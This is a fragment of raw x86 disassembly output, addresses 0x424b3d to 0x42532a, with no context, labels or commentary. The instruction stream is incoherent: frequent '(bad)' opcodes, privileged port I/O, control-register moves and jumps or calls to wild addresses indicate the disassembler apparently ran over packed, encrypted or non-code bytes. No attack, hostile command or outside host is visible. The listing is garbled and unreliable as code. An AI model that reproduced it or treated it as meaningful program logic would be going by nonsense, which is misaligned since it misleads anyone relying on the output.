  424b3d:	fadd   QWORD PTR [eax]
  424b3f:	lea    edi,[edi]
  424b41:	test   al,0xf8
  424b43:	add    bh,BYTE PTR [ebx+0x1888dc]
  424b49:	sti    
  424b4a:	add    eax,0x4806fa74
  424b4f:	and    eax,0xdc8bf4
  424b54:	push   eax
  424b55:	fs jmp 0xdcfd5ef3
  424b5b:	mov    eax,DWORD PTR [edi+ebp*4-0x74fffe88]
  424b62:	sub    al,0xf6
  424b64:	adc    eax,0x40ef0b
  424b69:	lock xchg esp,eax
  424b6b:	jmp    0x531ad8b
  424b70:	add    dh,bl
  424b72:	jno    0x424ba5
  424b74:	pop    edx
  424b75:	mov    bh,0x4d
  424b77:	push   ecx
  424b78:	and    al,0x8a
  424b7a:	pop    ecx
  424b7b:	rol    BYTE PTR [eax],1
  424b7d:	bound  esi,QWORD PTR [edx+0x78ac1596]
  424b83:	test   al,0x87
  424b85:	ja     0x424bd1
  424b87:	adc    eax,DWORD PTR [eax+0x62]
  424b8a:	and    eax,0xb26200bd
  424b8f:	dec    ebx
  424b90:	sti    
  424b91:	dec    edi
  424b92:	bound  esi,QWORD PTR [ebx]
  424b94:	inc    esp
  424b95:	bound  ebx,QWORD PTR [edi-0x31]
  424b98:	cmp    eax,0xfffeb160
  424b9d:	ja     0x424b22
  424b9f:	jae    0x424bbd
  424ba1:	xchg   edi,eax
  424ba2:	mov    ah,0xfe
  424ba4:	jmp    DWORD PTR [edx-0x7d]
  424ba7:	jae    0x424b2d
  424ba9:	ds es add eax,0x82620000
  424bb0:	sbb    al,0x1
  424bb2:	out    0x3d,eax
  424bb4:	loope  0x424b55
  424bb6:	bound  esi,QWORD PTR [edx+0x6dd74ffe]
  424bbc:	fiadd  DWORD PTR [edi-0x36]
  424bbf:	pop    esp
  424bc0:	xchg   ebp,eax
  424bc1:	cli    
  424bc2:	mov    ch,0x6c
  424bc4:	test   eax,0x3a63b235
  424bc9:	add    BYTE PTR [ebp+0x62fde20f],ah
  424bcf:	mov    dl,0xfe
  424bd1:	jae    0x424b81
  424bd3:	je     0x424c52
  424bd5:	retf   
  424bd6:	jp     0x424b7c
  424bd8:	sar    edx,cl
  424bda:	test   DWORD PTR [edx+0x6b1d5abe],eax
  424be0:	jg     0x424ba6
  424be2:	cmp    BYTE PTR [ebp-0x275f0002],0xeb
  424be9:	add    edx,DWORD PTR [ebx]
  424beb:	sub    al,0x32
  424bed:	jge    0x424b86
  424bef:	rcl    DWORD PTR [edx+0x40],1
  424bf2:	bound  ecx,QWORD PTR [edx]
  424bf4:	test   al,0x53
  424bf6:	mov    bl,0x29
  424bf8:	push   eax
  424bf9:	ins    DWORD PTR es:[edi],dx
  424bfa:	jne    0x424c17
  424bfc:	call   0xc0da3154
  424c01:	test   al,0x45
  424c03:	enter  0x7dab,0xa
  424c07:	or     ebp,DWORD PTR [eax+0x10299353]
  424c0d:	in     al,dx
  424c0e:	push   ecx
  424c0f:	sbb    ebp,eax
  424c11:	push   ebx
  424c12:	add    ch,bl
  424c14:	xchg   edi,eax
  424c15:	sbb    BYTE PTR [ebp+edi*8+0x2d7f83c7],0x28
  424c1d:	pop    ds
  424c1e:	das    
  424c1f:	push   0x5d
  424c21:	test   al,0x2e
  424c23:	pop    esi
  424c24:	or     ch,BYTE PTR [eax+0x280aad4a]
  424c2a:	inc    ebx
  424c2b:	mov    ebx,DWORD PTR [edx+0x58ce7cb5]
  424c31:	inc    esp
  424c32:	shl    DWORD PTR [edx-0x27],cl
  424c35:	out    0x54,eax
  424c37:	xor    BYTE PTR [edx],cl
  424c39:	pop    ds
  424c3a:	push   esp
  424c3b:	xlat   BYTE PTR ds:[ebx]
  424c3c:	ins    BYTE PTR es:[edi],dx
  424c3d:	clc    
  424c3e:	test   al,0xb9
  424c40:	(bad)  
  424c41:	jno    0x424c27
  424c43:	pop    ebp
  424c44:	sti    
  424c45:	sub    bl,BYTE PTR [ebx+0x3e80590]
  424c4b:	xlat   BYTE PTR ds:[ebx]
  424c4c:	sub    al,0x80
  424c4e:	push   0xffffffb1
  424c50:	(bad)  
  424c52:	add    ecx,DWORD PTR [edx-0x76566ae3]
  424c58:	push   ecx
  424c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c5a:	test   al,0xc8
  424c5c:	fsub   st,st(7)
  424c5e:	add    esp,edx
  424c60:	push   esp
  424c61:	add    DWORD PTR [ecx+esi*2-0x3d],ebp
  424c65:	cli    
  424c66:	out    dx,al
  424c67:	adc    BYTE PTR [esp+eax*2-0x7f],dl
  424c6b:	push   cs
  424c6c:	sub    edi,edx
  424c6e:	hlt    
  424c6f:	sbb    eax,0xe2e940d6
  424c74:	cwde   
  424c75:	je     0x424ca9
  424c77:	add    BYTE PTR [esi-0x33],ch
  424c7a:	add    cl,ch
  424c7c:	popa   
  424c7d:	ret    0xd914
  424c80:	push   esi
  424c81:	sbb    DWORD PTR [ecx],eax
  424c83:	mov    fs:0x674351c1,eax
  424c89:	push   ss
  424c8a:	mov    WORD PTR [esi+edx*8],gs
  424c8d:	sub    BYTE PTR [ebx+0x70],dl
  424c90:	push   ebx
  424c91:	sar    edx,0xfc
  424c94:	sbb    esi,edx
  424c96:	inc    eax
  424c97:	jmp    0xc4b6e57e
  424c9c:	mov    al,0x16
  424c9e:	dec    esi
  424c9f:	sbb    bh,BYTE PTR [ebx+0x5c]
  424ca2:	xor    DWORD PTR [esi-0x43],esi
  424ca5:	rcl    DWORD PTR [ecx+0x6e],0x33
  424ca9:	sar    edx,0xfc
  424cac:	in     eax,0xd5
  424cae:	inc    eax
  424caf:	jmp    0xdd3cee0c
  424cb4:	or     edx,ecx
  424cb6:	(bad)  
  424cb7:	repz cwde 
  424cb9:	rcl    DWORD PTR [esi*8+0x3f011971],0xa1
  424cc1:	dec    esp
  424cc2:	adc    esp,DWORD PTR [ebx+0x2b]
  424cc5:	ret    0x2afb
  424cc8:	dec    eax
  424cc9:	(bad)  [eax-0x9a7033c]
  424ccf:	in     al,0x28
  424cd1:	aaa    
  424cd2:	mov    bl,bl
  424cd4:	mov    eax,ds:0xa1205622
  424cd9:	mov    BYTE PTR [eax],al
  424cdb:	add    BYTE PTR [eax],al
  424cdd:	jo     0x424d54
  424cdf:	jp     0x424ccd
  424ce1:	scas   eax,DWORD PTR es:[edi]
  424ce2:	sub    dl,BYTE PTR [ebx+ecx*4+0x62]
  424ce6:	retf   0x56d3
  424ce9:	aam    0xb4
  424ceb:	pop    ebp
  424cec:	add    BYTE PTR [eax+ebx*2-0x3b],ch
  424cf0:	add    BYTE PTR [ebx-0x27],cl
  424cf3:	mov    dl,0x20
  424cf5:	push   esp
  424cf6:	sbb    DWORD PTR [ecx],eax
  424cf8:	mov    ecx,0x40d46b
  424cfd:	xor    esi,DWORD PTR [eax+0x3ffcffc4]
  424d03:	leave  
  424d04:	mov    DWORD PTR [esi-0x23],edi
  424d07:	or     ecx,0x76
  424d0a:	les    ebp,FWORD PTR [eax+eax*8]
  424d0d:	rol    dl,cl
  424d0f:	add    DWORD PTR [eax],eax
  424d11:	or     eax,DWORD PTR [eax+0x0]
  424d14:	push   ebx
  424d15:	pop    edx
  424d16:	jl     0x424ca9
  424d18:	cld    
  424d19:	sti    
  424d1a:	fadd   DWORD PTR [eax]
  424d1c:	mov    esi,DWORD PTR [esi]
  424d1e:	fisttp QWORD PTR [ecx-0x75]
  424d21:	repz sub dh,dh
  424d24:	xchg   ecx,eax
  424d25:	sub    ebx,esi
  424d27:	add    BYTE PTR [eax],al
  424d29:	sbb    BYTE PTR [ecx],0x1
  424d2c:	push   ebx
  424d2d:	jo     0x424cef
  424d2f:	dec    edx
  424d30:	call   FWORD PTR [edx-0x30]
  424d33:	(bad)  
  424d34:	dec    ebx
  424d36:	aas    
  424d37:	inc    esp
  424d38:	add    BYTE PTR [eax],cl
  424d3a:	inc    eax
  424d3b:	or     DWORD PTR [eax+0x1c],edx
  424d3e:	ins    DWORD PTR es:[edi],dx
  424d3f:	adc    DWORD PTR [ecx],eax
  424d41:	add    bl,cl
  424d43:	fadd   DWORD PTR [ecx+0x5541cb45]
  424d49:	and    al,0x93
  424d4b:	aas    
  424d4c:	or     DWORD PTR [edx-0x2d],edx
  424d4f:	sbb    BYTE PTR [esi],cl
  424d51:	inc    eax
  424d52:	mov    ebp,DWORD PTR [eax]
  424d54:	not    BYTE PTR [ecx]
  424d56:	bound  esi,QWORD PTR ds:0x252c75be
  424d5c:	cmp    ah,BYTE PTR [esi+esi*1]
  424d5f:	bound  edi,QWORD PTR [ebp+0x5c]
  424d62:	inc    esi
  424d63:	mov    edx,0x9f2a15a3
  424d68:	ds add al,bh
  424d6b:	mov    dh,0x46
  424d6d:	(bad)  
  424d6e:	fcomi  st,st(6)
  424d70:	loopne 0x424d9d
  424d72:	xchg   ecx,eax
  424d73:	jb     0x424dc3
  424d75:	lea    esp,[esi-0x249df32a]
  424d7b:	std    
  424d7c:	loopne 0x424db5
  424d7e:	cmp    dh,BYTE PTR [ebp+0x3e6200bd]
  424d84:	lds    esi,FWORD PTR [esp+edx*2+0x37]
  424d88:	inc    ecx
  424d89:	and    al,0x4a
  424d8b:	das    
  424d8c:	cdq    
  424d8d:	adc    cl,bl
  424d8f:	leave  
  424d90:	jns    0x424d8e
  424d92:	sbb    eax,0xe723e0ee
  424d97:	in     eax,0xe0
  424d99:	aas    
  424d9a:	(bad)  
  424d9b:	sbb    al,0x5a
  424d9d:	push   eax
  424d9e:	mov    edi,0x63408e5a
  424da3:	mov    dl,0xfe
  424da5:	xchg   BYTE PTR [eax],al
  424da7:	sahf   
  424da8:	xchg   esi,eax
  424da9:	push   es
  424daa:	push   eax
  424dab:	fnstcw WORD PTR [ecx+0x3b5a51a5]
  424db1:	xor    DWORD PTR [esi+esi*2],esp
  424db4:	and    ecx,DWORD PTR [edx]
  424db6:	dec    esp
  424db7:	jno    0x424e2b
  424db9:	dec    BYTE PTR [esi+eiz*1-0x3aaff722]
  424dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dc1:	ss mov cr6,edx
  424dc5:	sbb    BYTE PTR [eax],cl
  424dc7:	sbb    cl,BYTE PTR [ebx]
  424dc9:	xor    DWORD PTR [esi+eiz*1],esp
  424dcc:	pushf  
  424dcd:	ja     0x424e13
  424dcf:	jle    0x424daa
  424dd1:	(bad)  
  424dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dd3:	ja     0x424dfe
  424dd5:	test   DWORD PTR [ebx+0x62],0x41dfac52
  424ddc:	pop    esi
  424ddd:	sub    ch,dh
  424ddf:	loope  0x424dd0
  424de1:	add    ah,BYTE PTR [ebp+0x3a54f79]
  424de7:	out    0x2c,eax
  424de9:	int3   
  424dea:	adc    esp,ebp
  424dec:	rcl    BYTE PTR [ebp+0x6ee87680],1
  424df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424df3:	out    dx,eax
  424df4:	dec    ebp
  424df5:	add    al,0xf4
  424df7:	(bad)  
  424df8:	jl     0x424d87
  424dfa:	push   ebx
  424dfb:	pop    es
  424dfc:	ret    
  424dfd:	jns    0x424d9a
  424dff:	(bad)  
  424e00:	(bad)  
  424e02:	js     0x424e36
  424e04:	push   ebp
  424e05:	and    al,0xe0
  424e07:	pop    ecx
  424e08:	sub    DWORD PTR [ebx-0x1969fff2],esi
  424e0e:	daa    
  424e0f:	add    al,0xdf
  424e11:	retf   
  424e12:	sbb    eax,0x1c5683f9
  424e17:	loopne 0x424e7e
  424e19:	ret    0x11d
  424e1c:	cmp    eax,0xc57a279e
  424e21:	and    ah,BYTE PTR [edx]
  424e23:	inc    edi
  424e24:	xchg   ebp,eax
  424e25:	push   esi
  424e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e27:	xlat   BYTE PTR ds:[ebx]
  424e28:	mov    bh,0xd1
  424e2a:	out    0x4e,eax
  424e2c:	in     eax,0xb5
  424e2e:	sbb    DWORD PTR [esi-0x23],ecx
  424e31:	enter  0x3675,0xde
  424e35:	dec    esi
  424e36:	loop   0x424e8a
  424e38:	xor    dl,al
  424e3a:	mov    eax,0x4c2ce51b
  424e3f:	lock call 0xa4d2:0x6078285c
  424e47:	rcl    BYTE PTR [eax],cl
  424e49:	push   eax
  424e4a:	add    DWORD PTR [ebp+eax*1+0x2ae151bf],ebx
  424e51:	sbb    al,0xfd
  424e53:	(bad)  
  424e54:	fadd   DWORD PTR [edx-0x314a4a7a]
  424e5a:	test   DWORD PTR [ebp+0x6252daad],esp
  424e60:	xor    eax,0x137408fd
  424e65:	into   
  424e66:	stc    
  424e67:	mov    bh,0xec
  424e69:	(bad)  
  424e6b:	add    DWORD PTR [eax],ebp
  424e6d:	test   DWORD PTR [ecx],eax
  424e6f:	jmp    0x5822f74
  424e74:	jmp    0xd6419b1c
  424e79:	push   ss
  424e7a:	adc    BYTE PTR [edx+eiz*2+0x12],0x28
  424e7f:	push   eax
  424e80:	bound  ebx,QWORD PTR [ebx-0x21d3782f]
  424e86:	push   ebx
  424e87:	inc    esp
  424e88:	shr    DWORD PTR [esi+0x31],0xf6
  424e8c:	(bad)  
  424e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e8e:	fldcw  WORD PTR [eax-0x6e]
  424e91:	pop    edi
  424e92:	fld    DWORD PTR [eax]
  424e94:	cmp    edx,DWORD PTR [edi-0x69]
  424e97:	inc    esp
  424e98:	popf   
  424e99:	pop    edi
  424e9a:	mov    cl,0xdc
  424e9c:	mov    ebp,0xa57dd967
  424ea1:	or     dl,BYTE PTR [ecx+0x4261f1bf]
  424ea7:	in     eax,dx
  424ea8:	leave  
  424ea9:	sub    al,0x5a
  424eab:	mov    edi,0x251cdf1c
  424eb0:	leave  
  424eb1:	fcomp  QWORD PTR [eax+0x5098bfd1]
  424eb7:	dec    ebp
  424eb8:	add    eax,0xe8a104be
  424ebd:	popa   
  424ebe:	(bad)  [ecx]
  424ec0:	push   ax
  424ec2:	fadd   DWORD PTR [eax]
  424ec4:	add    bl,cl
  424ec6:	push   0xc9910440
  424ecb:	dec    edx
  424ecc:	call   0x43883b
  424ed1:	retf   
  424ed2:	jbe    0x424ee8
  424ed4:	pusha  
  424ed5:	add    BYTE PTR [ebp+0x3f830115],bl
  424edb:	jmp    0x59c70f63
  424ee0:	nop
  424ee1:	add    DWORD PTR [ebx-0x2b],edi
  424ee4:	call   0xf6b8a71f
  424ee9:	mov    DWORD PTR [edi+0x3b3316b9],edi
  424eef:	push   0x5493244d
  424ef4:	inc    ebp
  424ef5:	and    al,0x6f
  424ef7:	dec    esi
  424ef8:	inc    ebp
  424ef9:	and    al,0x67
  424efb:	ins    DWORD PTR es:[edi],dx
  424efc:	sub    eax,0x81dd3a52
  424f01:	fsub   DWORD PTR [ecx+0x773959c1]
  424f07:	mov    cl,0x12
  424f09:	mov    edi,eax
  424f0b:	jmp    0x424f47
  424f0d:	dec    esp
  424f0e:	pop    edi
  424f0f:	mov    ebp,0x6310deef
  424f14:	sbb    dh,cl
  424f16:	cmp    BYTE PTR [edx-0x36e0a378],cl
  424f1c:	test   ebx,ebx
  424f1e:	outs   dx,DWORD PTR ds:[esi]
  424f1f:	loop   0x424ea2
  424f21:	std    
  424f22:	jle    0x424f86
  424f24:	jne    0x424f63
  424f26:	jbe    0x424f3f
  424f28:	push   es
  424f29:	mov    DWORD PTR [edi],edi
  424f2b:	mov    cl,0x12
  424f2d:	mov    eax,DWORD PTR [edi-0x4f]
  424f30:	sbb    ch,BYTE PTR [edx+0xf]
  424f33:	pop    eax
  424f34:	rol    BYTE PTR [edx+ebx*1],0xd
  424f38:	not    BYTE PTR ds:0x3ac2ab00
  424f3e:	add    BYTE PTR [edx+0x33],ah
  424f41:	ret    0xdf0c
  424f44:	repnz adc DWORD PTR [ecx+ebp*8],edx
  424f48:	outs   dx,BYTE PTR ds:[esi]
  424f49:	loop   0x424f62
  424f4b:	sbb    eax,0x6201bbb5
  424f50:	mov    dl,0x8d
  424f52:	inc    esp
  424f53:	jle    0x424eff
  424f55:	(bad)  
  424f57:	adc    BYTE PTR [eax],al
  424f59:	stos   DWORD PTR es:[edi],eax
  424f5a:	push   es
  424f5b:	or     ebx,edi
  424f5d:	mov    edx,0x3b26201
  424f62:	test   DWORD PTR [edi],0xe7d58b54
  424f68:	rcl    BYTE PTR [ebx],0x2c
  424f6b:	out    0x8b,eax
  424f6d:	add    al,BYTE PTR [eax-0x72fc5215]
  424f73:	jmp    0x424f22
  424f75:	sbb    BYTE PTR [eax-0x65],dl
  424f78:	jmp    0xf62b6095
  424f7d:	call   0x18f3d89d
  424f82:	or     DWORD PTR [ecx-0x4f],edi
  424f85:	fstp   TBYTE PTR [edi-0x11]
  424f88:	cli    
  424f89:	add    al,0x6f
  424f8b:	jns    0x424f81
  424f8d:	jge    0x424f50
  424f8f:	or     DWORD PTR [ecx+0x6869fffe],esi
  424f95:	adc    edx,ebx
  424f97:	jmp    0x3a3d7613
  424f9c:	mov    cl,0xfe
  424f9e:	inc    DWORD PTR [eax]
  424fa0:	fcomip st,st(5)
  424fa2:	call   0xbc8926ba
  424fa7:	add    DWORD PTR [edx-0x4e],esp
  424faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fab:	(bad)  
  424fac:	and    al,0xb2
  424fae:	inc    BYTE PTR [ebx-0x78ef42de]
  424fb4:	xchg   esi,eax
  424fb5:	xchg   esi,eax
  424fb6:	repnz out 0xea,eax
  424fb9:	fdiv   DWORD PTR [edx]
  424fbb:	add    al,0x62
  424fbd:	mov    dl,0x90
  424fbf:	add    al,0x62
  424fc1:	fstp   DWORD PTR [esi+0x40]
  424fc4:	jle    0x424fab
  424fc6:	out    0x9c,al
  424fc8:	and    BYTE PTR [ecx],dh
  424fca:	pop    ds
  424fcb:	add    esp,DWORD PTR [edx-0x27]
  424fce:	xchg   esp,eax
  424fcf:	cmp    BYTE PTR [ecx+0x65f9cbe5],ch
  424fd5:	fstp   DWORD PTR [esi+0x30]
  424fd8:	inc    esi
  424fd9:	in     eax,dx
  424fda:	(bad)  
  424fdb:	ret    
  424fdc:	adc    eax,0x21dbec95
  424fe1:	cmc    
  424fe2:	fcmovne st,st(1)
  424fe4:	and    ecx,edx
  424fe6:	out    0x10,eax
  424fe8:	daa    
  424fe9:	adc    eax,0x17eaffcc
  424fee:	in     al,0x8c
  424ff0:	es cmc 
  424ff2:	mov    edi,0xa3520033
  424ff7:	or     ch,bh
  424ff9:	push   ss
  424ffa:	out    dx,eax
  424ffb:	ss mov dl,0xbe
  424ffe:	cmc    
  424fff:	aas    
  425000:	jo     0x42501b
  425002:	call   0xce60508b
  425007:	mov    ax,ds:0x33274763
  42500d:	dec    edx
  42500e:	mov    BYTE PTR [edi+0x3],bh
  425011:	bound  edx,QWORD PTR [edx-0x66]
  425014:	xor    ebx,ebp
  425016:	xchg   edx,eax
  425017:	shr    BYTE PTR [ecx],0x18
  42501a:	mov    edi,0xe61884a3
  42501f:	adc    edx,esi
  425021:	jp     0x424fea
  425023:	scas   eax,DWORD PTR es:[edi]
  425024:	add    ah,BYTE PTR [edx-0x27]
  425027:	std    
  425028:	imul   esi
  42502a:	adc    al,0xec
  42502c:	xor    esp,edi
  42502e:	push   edi
  42502f:	mov    ah,0xa1
  425031:	jmp    0x1f2c51f4
  425036:	sub    bh,dl
  425038:	aam    0x81
  42503a:	jmp    0x42507c
  42503c:	jmp    0x644fe61f
  425041:	mov    eax,ds:0x772993d2
  425046:	in     eax,0x88
  425048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425049:	lds    eax,FWORD PTR [esi]
  42504b:	pop    ebx
  42504c:	add    eax,0x720c4461
  425051:	jmp    0x4250a9
  425053:	mov    BYTE PTR [ecx-0x5c],0x29
  425057:	add    cl,ch
  425059:	jmp    0xe71f7573
  42505e:	xchg   esi,eax
  42505f:	jmp    0x11c036e
  425064:	arpl   WORD PTR ds:0x6034f5,bx
  42506a:	and    eax,0x257424f5
  42506f:	cmc    
  425070:	sub    al,0x11
  425072:	outs   dx,DWORD PTR ds:[esi]
  425073:	sbb    BYTE PTR [eax],al
  425075:	jmp    0xc5676651
  42507a:	push   cs
  42507b:	mov    edi,0x2395a930
  425080:	pop    esp
  425081:	inc    edx
  425082:	loope  0x425018
  425084:	and    DWORD PTR [ebx-0x428226a6],ebp
  42508a:	push   edx
  42508b:	push   cs
  42508c:	push   esp
  42508d:	pop    ds
  42508e:	out    0xc,eax
  425090:	and    eax,0x52a710d9
  425095:	fs xchg edx,eax
  425097:	cmc    
  425098:	adc    BYTE PTR [eax-0x5e],ah
  42509b:	cmc    
  42509c:	sbb    BYTE PTR [ecx-0x16ffd671],dl
  4250a2:	fadd   st,st(0)
  4250a4:	test   BYTE PTR [esi-0x17522a95],dl
  4250aa:	enter  0x8640,0x0
  4250ae:	dec    edi
  4250af:	mov    cl,0xa
  4250b1:	mov    ebp,DWORD PTR [eax+0x50]
  4250b4:	in     al,dx
  4250b5:	je     0x42510b
  4250b7:	push   0x11420f3e
  4250bc:	and    eax,0xf7c5b110
  4250c1:	je     0x42512a
  4250c3:	mov    ebp,0xf9c6ff4a
  4250c8:	push   cs
  4250c9:	inc    eax
  4250ca:	retf   
  4250cb:	pop    edx
  4250cc:	lds    ecx,FWORD PTR [eax+eax*1]
  4250cf:	inc    esi
  4250d0:	xchg   ebp,eax
  4250d1:	jne    0x4250e7
  4250d3:	xor    BYTE PTR [ecx],dl
  4250d5:	and    eax,0xd1d0f510
  4250da:	add    DWORD PTR [ebx-0x58bb7827],ecx
  4250e0:	leave  
  4250e1:	xor    esi,ebp
  4250e3:	jmp    0xe27b3367
  4250e8:	arpl   dx,dx
  4250ea:	add    DWORD PTR [ebx-0x5f090627],ecx
  4250f0:	imul   bx,WORD PTR [edx],0xfff0
  4250f4:	(bad)
  4250f8:	aam    0x0
  4250fa:	add    BYTE PTR [eax-0x6c],cl
  4250fd:	push   ecx
  4250fe:	(bad)  
  4250ff:	aad    0x7f
  425101:	add    BYTE PTR [eax],al
  425103:	cmp    edx,DWORD PTR [eax-0x39]
  425106:	call   0x43dd8f
  42510b:	and    bl,bl
  42510d:	add    bl,0xc7
  425110:	cwde   
  425111:	jne    0x42511f
  425113:	mov    esi,0xfc8bf601
  425118:	jo     0x425177
  42511a:	push   eax
  42511b:	or     bl,cl
  42511d:	sbb    al,0x90
  425120:	mov    ebp,ecx
  425122:	and    al,0xbd
  425124:	fadd   DWORD PTR [eax]
  425126:	lea    esp,[edx-0xa]
  425129:	call   0x48125b45
  42512e:	add    DWORD PTR [edx+0x48],esp
  425131:	mov    edi,0xdd8c005b
  425136:	xor    eax,0xbfb71e7f
  42513b:	jg     0x42510b
  42513d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42513e:	das    
  42513f:	push   ebp
  425140:	sub    al,0x49
  425142:	dec    edx
  425143:	and    al,0x6a
  425145:	fbstp  TBYTE PTR [ebp-0x1d8928ad]
  42514b:	adc    ebp,edx
  42514d:	xchg   dl,ah
  42514f:	push   cs
  425150:	jmp    0x4251c8
  425152:	loop   0x425173
  425154:	mov    edx,0x62014adc
  425159:	aaa    
  42515a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42515b:	test   DWORD PTR [edi+0x6297829b],ecx
  425161:	mov    dl,0xfe
  425163:	xchg   BYTE PTR [esi],ah
  425165:	xchg   esi,eax
  425166:	xacquire xchg BYTE PTR [ecx+0x5a244239],dl
  42516d:	xor    eax,0x30de0bbe
  425172:	(bad)  
  425173:	jmp    DWORD PTR [edx+0x47]
  425176:	mov    eax,ds:0x13c34e66
  42517b:	and    al,0x82
  42517d:	sbb    eax,0xb3b20b43
  425182:	repnz pop edi
  425184:	je     0x425178
  425186:	add    al,0x7f
  425188:	push   ds
  425189:	mov    dh,0x83
  42518b:	shl    BYTE PTR [esi+0x1d81449b],0x77
  425192:	(bad)  
  425193:	jmp    DWORD PTR [edx-0x29]
  425196:	sbb    BYTE PTR [eax+eax*1],ah
  425199:	dec    esi
  42519a:	add    cl,al
  42519c:	out    0xb8,eax
  42519e:	xor    ah,BYTE PTR [ecx]
  4251a0:	and    al,0x71
  4251a2:	fld1   
  4251a4:	push   ss
  4251a5:	dec    eax
  4251a6:	mov    ebx,0x3be20c23
  4251ab:	loopne 0x4251ad
  4251ad:	jo     0x4251ad
  4251af:	pop    esi
  4251b0:	and    BYTE PTR [esi],bh
  4251b2:	in     eax,0x10
  4251b4:	xchg   esi,eax
  4251b5:	adc    eax,0xe503e7da
  4251ba:	les    ebp,FWORD PTR [edi+0x5edf4c96]
  4251c0:	lds    ecx,FWORD PTR [ebx-0x67]
  4251c3:	aas    
  4251c4:	add    esp,DWORD PTR [edx-0x27]
  4251c7:	out    0xc6,al
  4251c9:	xor    cl,BYTE PTR [esi+0x7a]
  4251cc:	mov    ecx,0x88e7d963
  4251d1:	test   al,0xb0
  4251d3:	jae    0x4251a3
  4251d5:	(bad)  
  4251d6:	fldcw  WORD PTR [ebp-0x44]
  4251d9:	ficomp WORD PTR [edi+0x52290cbc]
  4251df:	lods   al,BYTE PTR ds:[esi]
  4251e0:	out    0x6d,eax
  4251e2:	mov    al,0xf0
  4251e4:	fld    TBYTE PTR [eax]
  4251e6:	rcl    DWORD PTR [ebx-0x1fe4220d],1
  4251ec:	mov    BYTE PTR [esi],dl
  4251ee:	cmc    
  4251ef:	out    dx,eax
  4251f0:	mov    BYTE PTR [edi+0x634d6ab0],ah
  4251f6:	fldcw  WORD PTR [ebp-0x44]
  4251f9:	fisttp QWORD PTR [ebp+0x2f004e00]
  4251ff:	(bad)  
  425201:	mov    fs,WORD PTR [esi-0x2053f80b]
  425207:	adc    eax,0x96dc03e9
  42520c:	xor    edi,DWORD PTR [esi]
  42520e:	lahf   
  42520f:	push   ds
  425210:	addr16 (bad) 
  425212:	dec    esi
  425213:	xchg   esi,eax
  425214:	sbb    eax,0x19293e89
  425219:	(bad)  
  42521a:	xchg   edi,eax
  42521b:	mov    ebp,0x1018c101
  425220:	add    cl,ch
  425222:	fcomp  QWORD PTR [ecx-0x274e128c]
  425228:	(bad)  
  425229:	stos   BYTE PTR es:[edi],al
  42522a:	ficom  DWORD PTR [ecx-0x25d30917]
  425230:	add    BYTE PTR [edx+0x54],ch
  425233:	mov    ebp,0xc721e205
  425238:	fnstenv [eax-0x1a12c4de]
  42523e:	xchg   edx,eax
  42523f:	and    al,0x53
  425241:	pusha  
  425242:	and    eax,0xdcbe14f5
  425247:	or     eax,0xadf9f525
  42524c:	dec    ebx
  42524d:	call   0x6533a4b3
  425252:	iret   
  425253:	inc    esp
  425254:	add    eax,0x6cb2a1fb
  425259:	jb     0x4252c8
  42525b:	cmc    
  42525c:	adc    al,0x98
  42525e:	inc    BYTE PTR [ebp+0x25]
  425261:	add    DWORD PTR [eax],eax
  425263:	jmp    0x4251f4
  425265:	jmp    0xfb014034
  42526a:	xchg   ebx,eax
  42526b:	pop    ebp
  42526c:	push   ds
  42526d:	cmp    BYTE PTR [ebp-0x54f6197b],dl
  425273:	push   ebp
  425274:	cmc    
  425275:	adc    al,0xbb
  425277:	stos   BYTE PTR es:[edi],al
  425278:	push   esp
  425279:	cli    
  42527a:	jne    0x42529f
  42527c:	dec    esp
  42527d:	dec    ebx
  42527e:	loop   0x4252ee
  425280:	xchg   BYTE PTR [ebx-0x20],al
  425283:	nop
  425284:	sub    DWORD PTR [eax+0x38],edx
  425287:	fisttp QWORD PTR [eiz*1-0x51268be7]
  42528e:	out    dx,eax
  42528f:	or     DWORD PTR [edi+0x5261e994],esp
  425295:	jmp    0x75b3109a
  42529a:	push   ds
  42529b:	mov    al,0x19
  42529d:	and    eax,0x94a7e18
  4252a2:	call   0x433071
  4252a7:	sub    BYTE PTR [ebp+0x7aad0f40],cl
  4252ad:	test   eax,eax
  4252af:	add    al,0x19
  4252b1:	fmul   DWORD PTR [ebx+0x6e956cd6]
  4252b7:	in     eax,0x5d
  4252b9:	mov    WORD PTR [esi-0x10],cs
  4252bc:	push   cs
  4252bd:	je     0x425280
  4252bf:	inc    eax
  4252c0:	(bad)
  4252c4:	aam    0x0
  4252c6:	mov    al,BYTE PTR [eax]
  4252c8:	js     0x4252c8
  4252ca:	push   esi
  4252cb:	pop    ebp
  4252cc:	mov    al,ds:0x890cc552
  4252d1:	int    0x0
  4252d3:	mov    ebp,edi
  4252d5:	cdq    
  4252d6:	(bad)  
  4252d7:	push   edx
  4252d8:	into   
  4252d9:	pop    es
  4252da:	dec    esi
  4252db:	mov    esp,DWORD PTR [ecx+0x5cf783c5]
  4252e1:	jg     0x4252f5
  4252e3:	div    BYTE PTR [esi]
  4252e5:	adc    ecx,DWORD PTR [edi]
  4252e7:	and    ebp,DWORD PTR [ebx+0x4a]
  4252ea:	call   0x2b15386f
  4252ef:	mov    eax,DWORD PTR [ecx-0x32]
  4252f2:	xchg   esp,eax
  4252f3:	inc    esp
  4252f4:	lahf   
  4252f5:	test   eax,0xd5e870e2
  4252fa:	add    BYTE PTR [esi-0x8],ah
  4252fd:	pop    esp
  4252fe:	xor    DWORD PTR [ebx+0x4f],esi
  425301:	(bad)  
  425302:	mov    edx,0xf659dbeb
  425307:	je     0x425341
  425309:	pusha  
  42530a:	mov    esi,0xe9a6d02c
  42530f:	pop    eax
  425310:	bound  edx,QWORD PTR [ebx]
  425312:	add    eax,0xb64f6500
  425317:	xchg   DWORD PTR [ecx],edx
  425319:	sub    al,0xc7
  42531b:	call   0x472fb7
  425320:	out    0x82,eax
  425322:	sbb    dl,bl
  425324:	loop   0x42532c
  425326:	loope  0x42533b
  425328:	arpl   bp,dx
  42532a:	out    dx,eax
